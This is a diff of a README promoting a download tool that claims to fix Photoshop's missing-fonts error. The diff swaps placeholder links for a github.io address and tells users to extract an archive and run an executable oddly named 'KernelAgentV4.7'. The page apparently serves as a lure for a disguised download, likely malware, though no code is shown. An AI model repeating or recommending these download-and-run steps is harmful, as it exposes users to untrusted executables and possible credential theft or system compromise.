@@ -2,13 +2,15 @@
 
 This tool fixes the Photoshop error “This type layer is missing fonts” by scanning your PSD files, identifying missing font layers, and auto-replacing them with available system or embedded alternatives using `KernelAgentV4.7`.
 
-[![Download Font Fix Tool](https://img.shields.io/badge/Download-Photoshop_MissingFonts_Fix-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Font Fix Tool](https://img.shields.io/badge/Download-Photoshop_MissingFonts_Fix-blueviolet)](https://photoshop-missing-fonts-fix.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://photoshop-missing-fonts-fix.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g., `C:\PhotoshopFontsFix`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧠 The tool will scan open PSDs or selected folders, detect missing fonts, and replace or load embedded equivalents  
